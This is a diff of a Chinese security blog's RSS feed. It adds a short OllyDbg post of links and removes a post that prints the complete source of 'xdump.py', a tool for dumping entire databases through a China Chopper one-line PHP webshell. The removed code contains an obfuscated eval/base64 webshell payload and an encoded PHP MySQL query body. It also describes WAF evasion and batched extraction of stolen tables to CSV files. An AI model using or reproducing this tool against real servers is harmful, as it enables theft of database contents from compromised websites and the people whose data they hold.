@@ -5,9 +5,37 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 24 Dec 2016 20:55:17 +0800</pubDate>
-    <lastBuildDate>Sat, 24 Dec 2016 20:55:17 +0800</lastBuildDate>
+    <pubDate>Sun, 25 Dec 2016 12:54:01 +0800</pubDate>
+    <lastBuildDate>Sun, 25 Dec 2016 12:54:01 +0800</lastBuildDate>
     <generator>Jekyll v3.3.1</generator>
+    
+      <item>
+        <title>od命令</title>
+        <description>&lt;h3 id=&quot;0x01-od知识&quot;&gt;0x01 OD知识&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;od调试常见断点及原理
+    http://blog.csdn.net/qq_20977145/article/details/52687730
+2&amp;gt;条件断点,条件记录断点
+    http://blog.csdn.net/hgy413/article/details/7711925
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x02-od技巧&quot;&gt;0x02 OD技巧&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Sun, 25 Dec 2016 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/crack/2016/12/25/od%E5%91%BD%E4%BB%A4/</link>
+        <guid isPermaLink="true">http://localhost:4000/crack/2016/12/25/od%E5%91%BD%E4%BB%A4/</guid>
+        
+        <category>od</category>
+        
+        
+        <category>crack</category>
+        
+      </item>
     
       <item>
         <title>漏洞战争-cve-2011-0027</title>
@@ -1570,325 +1598,6 @@ c)利用方式不是很方便
         <category>assert</category>
         
         <category>eval</category>
-        
-        
-        <category>web</category>
-        
-      </item>
-    
-      <item>
-        <title>一句话webshell客户端脱库</title>
-        <description>&lt;h1 id=&quot;xdumppy&quot;&gt;xdump.py&lt;/h1&gt;
-
-&lt;h3 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[!] legal disclaimer: Usage of xdump.py for attacking targets without prior mutual consent is illegal.
-It is the end user's responsibility to obey all applicable local, state and federal laws. 
-Developers assume no liability and are not responsible for any misuse or damage caused by this program
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 xdump.py
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xdump.py是一个python3下的脱库脚本,只要提供一句话webshell和相关密码就可脱库,与一般大马脱库的区别在于这里的脱库可
-订制,可灵活变换代码以绕过waf,相当于用chopper的思路来脱库,不过脱库方法可订制,且比一般大马的脱库更好用,理论上
-xdump.py可脱任意大小的数据库,不用担心会超时,因为xdump采用的是每次只脱部分少量数据[eg.每次脱200条数据],也可在代
-码中设置每次延时一定时间再继续脱少量数据.
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;支持两种脱库用法
-
-1.不抓包模式
-不抓包模式目前仅测试过mysql+php的脱库,其他类型应该暂不支持,因为不抓包模式用的是固定的php连接数据库的代码
-
-2.抓包模式
-抓包模式支持菜刀支持的所有数据库和脚本组合类型的脱库,需要抓包才能用.抓包方法如下:
-
-a.chopper连上webshell
-b.charles设置好本地sock5代理.[eg.127.0.0.1:8889]
-c.proxfier设置chopper的代理为charles提供的127.0.0.1:8889
-d.在chopper中配置好数据库连接参数并连接数据库
-e.在chopper连上数据库后随便双击某个数据库的某个表
-f.将e步骤在charles中抓取的包整理下存放在本地,整理的格式在代码中有示例,需要提供header和post两份数据,示例文件如下
-link:https://github.com/3xp10it/xdump
-g.运行python3 xdump.py
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;code&quot;&gt;Code&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'''
-#header文件格式要求
-eg.
-
-Cache-Control:no-cache
-Referer:http://www.abc.com
-Content-Type:application/x-www-form-urlencoded
-User-Agent:Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
-Connection:keey-alive
-Accept:*/*
-
-#post数据文件格式要求,eg.
-
-
-chopperPassValue=$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval($xx($yy[z0]));
-z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRoc3Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdOyR1c3I9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejIiXSk6JF9QT1NUWyJ6MiJdOyRwd2Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejMiXSk6JF9QT1NUWyJ6MyJdOyRkYm49JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejQiXSk6JF9QT1NUWyJ6NCJdOyRzcWw9YmFzZTY0X2RlY29kZSgkX1BPU1RbIno1Il0pOyRUPUBteXNxbF9jb25uZWN0KCRoc3QsJHVzciwkcHdkKTtAbXlzcWxfcXVlcnkoIlNFVCBOQU1FUyB1dGY4Iik7QG15c3FsX3NlbGVjdF9kYigkZGJuKTskcT1AbXlzcWxfcXVlcnkoJHNxbCk7JGk9MDt3aGlsZSgkY29sPUBteXNxbF9maWVsZF9uYW1lKCRxLCRpKSl7ZWNobygkY29sLiJcdHxcdCIpOyRpKys7fWVjaG8oIlxyXG4iKTt3aGlsZSgkcnM9QG15c3FsX2ZldGNoX3JvdygkcSkpe2ZvcigkYz0wOyRjPCRpOyRjKyspe2VjaG8odHJpbSgkcnNbJGNdKSk7ZWNobygiXHR8XHQiKTt9ZWNobygiXHJcbiIpO31AbXlzcWxfY2xvc2UoJFQpOztlY2hvKCJ8PC0iKTtkaWUoKTs=
-z1=this is db host
-z2=this is db user
-z3=this is db pass
-z4=this is db name
-z5=this is query param(提供的post文件里这行可以没有)
-'''
-
-import re
-import base64
-import sys
-import os
-from exp10it import get_http_domain_from_url
-from exp10it import get_random_header
-from exp10it import post_requests
-from exp10it import get_input_intime
-
-#global count, everyQueryCount,countOfTableDict
-#Attention!!!如果一次没有dump完意外中断了,下一次继续dump的时候要改变代码中的下面的count数,并要保证
-#start=everyQueryCount*count+1为继续dump的起始点的值[eg.每次查询为200,则要保证200*count+1=新起点dump处],运行之前只需要改count
-
-count =0
-start=0
-everyQueryCount = 0
-countOfTableDict={}
-maxUid=0
-primaryColumnName=&quot;0&quot;
-
-
-def getPrimaryColumnName():
-    #尝试获取可以dump的主键[eg.uid,如果是非数字的主键就不能根据主键来dump数据了]
-    result=query(&quot;select * from %s limit 1&quot; % tableName)
-    print(&quot;The table you select has below columns:\n&quot;)
-    pureData = result.split(&quot;\r\n&quot;)[0]
-    list = re.findall(&quot;([^\s\|]+)&quot;, pureData)
-    for eachColumn in list:
-        print(eachColumn)
-    primaryColumnName=input(&quot;Please input your primaryColumnName [eg.uid,this way use `where` keyword],\n\
-if there is no primaryColumnName like uid,input 0 for very slow way[this way use `order by + limit` \
-keyword]:\n&quot;)
-    return primaryColumnName
-
-
-def HandlePostData():
-    global postData, everyQueryCount, count,start,maxUid,primaryColumnName
-    start = everyQueryCount * count + 1
-    #下面这里要注意,直接用order by + limit查询的时候会很慢,最好先看要dump的表的主键是什么,然后根据主键用where来
-    #dump,这样会比limit快很多,具体情况要根据表的主键来改变下面的query语句,根据主键来查询的时候,终止查询的地方要
-    #由主键的最后一个数值来决定,不能由count(*)得到的结果来决定,因为count(*)得到的结果和通过主键[eg.uid]来得到的
-    #个数可能不同,也即要由select max(uid) from table得到的数值来决定
-    if primaryColumnName==&quot;0&quot;:
-        queryString = &quot;SELECT * FROM `%s` ORDER BY 1 DESC LIMIT %d,%d&quot; % (tableName, start, start + everyQueryCount - 1)
-        if start&amp;gt;countOfTableDict[tableName]:
-            sys.exit(1)
-    else:
-        #下面的语句中没有order by,如果加了order by uid limit 100000,101000也会很慢
-        queryString = &quot;SELECT * FROM `%s` where %s&amp;gt;=%d and %s&amp;lt;=%d&quot; % (tableName,primaryColumnName,start,primaryColumnName, start + everyQueryCount - 1)
-
-        if maxUid==0:
-            #尝试得到最大的uid值
-            tmpQueryString=&quot;select max(%s) from %s&quot; % (primaryColumnName,tableName)
-            print(tmpQueryString)
-            result=query(tmpQueryString)
-            tmp= re.search(&quot;(\d+)&quot;, result).group(1)
-            maxUid=int(tmp)
-            choose=input(&quot;Do you agree my got maxUid value:%d? [y|n] default[y]:&quot; % maxUid)
-            if choose==&quot;n&quot; or choose=='N':
-                maxUid=int(input(&quot;Please input your correct maxUid value:&quot;))
-            else:
-                pass
-        else:
-            #初次获取maxUid后以后不再获取maxUid
-            pass
-        if start&amp;gt;maxUid:
-            print(&quot;已经查完了这个表&quot;)
-            sys.exit(1)
-    print(queryString)
-    postData[&quot;z5&quot;] = base64.b64encode(queryString.encode(encoding=&quot;utf-8&quot;))
-
-
-def query(queryString):
-    global mode
-    global httpHeaderContent
-    global dbHost, dbUser, dbPass, dbName, postData, url, chopperPass
-    if mode == 1:
-        postData['z0'] = &quot;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRoc3Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdOyR1c3I9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejIiXSk6JF9QT1NUWyJ6MiJdOyRwd2Q9JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejMiXSk6JF9QT1NUWyJ6MyJdOyRkYm49JG0/c3RyaXBzbGFzaGVzKCRfUE9TVFsiejQiXSk6JF9QT1NUWyJ6NCJdOyRzcWw9YmFzZTY0X2RlY29kZSgkX1BPU1RbIno1Il0pOyRUPUBteXNxbF9jb25uZWN0KCRoc3QsJHVzciwkcHdkKTtAbXlzcWxfcXVlcnkoIlNFVCBOQU1FUyB1dGY4Iik7QG15c3FsX3NlbGVjdF9kYigkZGJuKTskcT1AbXlzcWxfcXVlcnkoJHNxbCk7JGk9MDt3aGlsZSgkY29sPUBteXNxbF9maWVsZF9uYW1lKCRxLCRpKSl7ZWNobygkY29sLiJcdHxcdCIpOyRpKys7fWVjaG8oIlxyXG4iKTt3aGlsZSgkcnM9QG15c3FsX2ZldGNoX3JvdygkcSkpe2ZvcigkYz0wOyRjPCRpOyRjKyspe2VjaG8odHJpbSgkcnNbJGNdKSk7ZWNobygiXHR8XHQiKTt9ZWNobygiXHJcbiIpO31AbXlzcWxfY2xvc2UoJFQpOztlY2hvKCJ8PC0iKTtkaWUoKTs=&quot;
-        postData['z1'] = dbHost
-        postData['z2'] = dbUser
-        postData['z3'] = dbPass
-        postData['z4'] = dbName
-        postData[
-            chopperPass] = &quot;$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval($xx($yy[z0]));&quot;
-
-        httpHeaderContent = get_random_header()
-        httpHeaderContent['Referer'] = get_http_domain_from_url(url)
-        httpHeaderContent['Content-Type'] = &quot;application/x-www-form-urlencoded&quot;
-
-    else:
-        postData[&quot;z4&quot;] = dbName
-
-    postData[&quot;z5&quot;] = base64.b64encode(queryString.encode(encoding=&quot;utf-8&quot;))
-    result = post_requests(url, data=postData, headers=httpHeaderContent)
-    html = result.content.decode(&quot;utf8&quot;)
-    return html[3:-3]
-
-
-def main():
-    os.system(&quot;pip3 install exp10it -U&quot;)
-    global httpHeaderContent, postData, headerFile, postDataFile, everyQueryCount, count, dbHost,dbUser,dbPass, dbName, tableName, url, chopperPass, mode,countOfTableDict,primaryColumnName
-    # count是第几次查询
-    httpHeaderContent = {}
-    postData = {}
-    url = input(&quot;please input webshell url:&quot;)
-    chopperPass = input(&quot;please input your webshell pass:&quot;)
-    print(&quot;1.不抓包模式\nor\n2.抓包后模式?\n不抓包模式目前只测试过php+mysql组合 抓包后模式功能更强大\
-[但是需要用charles做sock5代理,proxfier设置chopper的代理为charles提供的对应的代理地址,用charles抓到chopper\
-的包后按照代码中要求的格式保存到下面要提供的文件中]\n请选择对应模式序号,默认选择1&quot;)
-    mode = get_input_intime(1)
-    if str(mode) == &quot;1&quot;:
-        dbHost = input(&quot;please input db host:\n&quot;)
-        dbUser = input(&quot;please inpuot db user:\n&quot;)
-        dbPass = input(&quot;please input db pass:\n&quot;)
-        dbName = input(&quot;please input db name:\n&quot;)
-    else:
-        headerFile = input(&quot;please input your post header file abspath,header头要求如代码中的示例格式:\n&quot;)
-        postDataFile = input(&quot;please input your post data file abspath,post数据要求如代码中的示例格式:\n&quot;)
-        with open(headerFile, &quot;r+&quot;) as f:
-            for eachLine in f:
-                eachLine = re.sub(&quot;\s$&quot;, &quot;&quot;, eachLine)
-                eachHeaderParam = eachLine.split(&quot;:&quot;)[0]
-                eachHeaderParamValue = eachLine[len(eachHeaderParam) + 1:]
-                httpHeaderContent[eachHeaderParam] = eachHeaderParamValue
-
-        with open(postDataFile, &quot;r+&quot;) as f:
-            for eachLine in f:
-                eachLine = re.sub(&quot;\s$&quot;, &quot;&quot;, eachLine)
-                eachPostParam = eachLine.split(&quot;=&quot;)[0]
-                eachPostParamValue = eachLine[len(eachPostParam) + 1:]
-                postData[eachPostParam] = eachPostParamValue
-
-    while 1:
-        if mode == 1:
-            pass
-        else:
-            dbName = postData['z4']
-        result = query(&quot;show databases&quot;)
-        print(&quot;you are accessed on below database:\n&quot;)
-        pureData = result[len(result.split(&quot;\r\n&quot;)[0] + &quot;\r\n&quot;):]
-        list = re.findall(&quot;([^\s\|]+)&quot;, pureData)
-        for eachDbname in list:
-            print(eachDbname)
-        dbName = input(&quot;\nplease input db name you want to dump data from:\n&quot;)
-        print(&quot;\nthe db you choosed has below tables:\n&quot;)
-        if countOfTableDict=={}:
-            result = query(&quot;show tables&quot;)
-
-            pureData = result[len(result.split(&quot;\r\n&quot;)[0] + &quot;\r\n&quot;):]
-            list = re.findall(&quot;([^\s\|]+)&quot;, pureData)
-            for eachTableName in list:
-                result = query(&quot;select count(*) from %s&quot; % eachTableName)
-                entryNum = re.search(&quot;(\d+)&quot;, result).group(1)
-                countOfTableDict[eachTableName]=int(entryNum)
-                #print(eachTableName)
-
-        for eachTableName in countOfTableDict:
-            print(eachTableName+&quot;[%d]&quot; % int(countOfTableDict[eachTableName]))
-
-        tableName = input(&quot;\nplease input table name you want to dump:\n&quot;)
-
-        totalDataCount = int(input(&quot;please input how much data there are[想dump多少条数据?输入0代表dump整个表的内容]:\n&quot;))
-        everyQueryCount = int(
-            input(&quot;please input how much data do you want to query each time[每次要查询多少条数据?]:\n&quot;))
-        # 下面是一共要查询的次数
-        totalQueryCount = totalDataCount // everyQueryCount
-
-        #下面尝试选择可用于脱库的主键
-        primaryColumnName=getPrimaryColumnName()
-
-
-        if totalQueryCount!=0:
-            for i in range(totalQueryCount):
-                # 下面是每次查询完后对查询参数的改变函数
-                HandlePostData()
-
-                result = post_requests(url, data=postData, headers=httpHeaderContent)
-                html = result.content.decode(&quot;utf8&quot;)[3:-3]
-                #print(html)
-                # 菜刀中的数据是\r\n换行,如果是用大马中的post数据则有可能是\n换行符,菜刀版本不一样也有可能会是\n换行符,这里
-                # 的返回的sql数据中是\r\n换行符,不同情况时这里要修改
-                firstLine = html.split(&quot;\r\n&quot;)[0]
-                # 第一行中以-&amp;gt;|开头,最后一行为|&amp;lt;-
-                firstLine2write = firstLine[3:]
-                data2write = html[len(firstLine + &quot;\r\n&quot;):-3]
-                with open(&quot;%s.csv&quot; % tableName, &quot;a+&quot;) as f:
-                    if count == 0:
-                        f.write(firstLine2write + &quot;\r\n&quot;)
-                    # 这里每次查询2000条数据,要在post文件的数据中将对应数据修改成每次要查询的条数
-                    count += 1
-                    num = count * everyQueryCount
-                    print(&quot;查询了%d条数据&quot; % num)
-                    f.write(&quot;\r\n下面是到%d条数据:\r\n&quot; % num)
-                    f.write(data2write)
-        else:
-            while 1:
-                # 下面是每次查询完后对查询参数的改变函数
-                HandlePostData()
-
-                result = post_requests(url, data=postData, headers=httpHeaderContent)
-                html = result.content.decode(&quot;utf8&quot;)[3:-3]
-                #print(html)
-                # 菜刀中的数据是\r\n换行,如果是用大马中的post数据则有可能是\n换行符,菜刀版本不一样也有可能会是\n换行符,这里
-                # 的返回的sql数据中是\r\n换行符,不同情况时这里要修改
-                firstLine = html.split(&quot;\r\n&quot;)[0]
-                # 第一行中以-&amp;gt;|开头,最后一行为|&amp;lt;-
-                firstLine2write = firstLine[3:]
-                data2write = html[len(firstLine + &quot;\r\n&quot;):-3]
-                with open(&quot;%s.csv&quot; % tableName, &quot;a+&quot;) as f:
-                    if count == 0:
-                        f.write(firstLine2write + &quot;\r\n&quot;)
-                    # 这里每次查询2000条数据,要在post文件的数据中将对应数据修改成每次要查询的条数
-                    count += 1
-                    num = start+everyQueryCount-1
-                    print(&quot;查询了%d条数据&quot; % num)
-                    f.write(&quot;\r\n下面是到%d条数据:\r\n&quot; % num)
-                    f.write(data2write)
-
-                
-
-
-if __name__ == '__main__':
-    print(&quot;[!] legal disclaimer: Usage of xdump.py for attacking targets without prior mutual consent is \
-illegal.It is the end user's responsibility to obey all applicable local, state and federal laws. \
-Developers assume no liability and are not responsible for any misuse or damage caused by this program&quot;)
-    main()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Fri, 25 Nov 2016 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/web/2016/11/25/%E4%B8%80%E5%8F%A5%E8%AF%9Dwebshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%84%B1%E5%BA%93/</link>
-        <guid isPermaLink="true">http://localhost:4000/web/2016/11/25/%E4%B8%80%E5%8F%A5%E8%AF%9Dwebshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%84%B1%E5%BA%93/</guid>
-        
-        <category>webshell</category>
-        
-        <category>dump</category>
-        
-        <category>sql</category>
         
         
         <category>web</category>
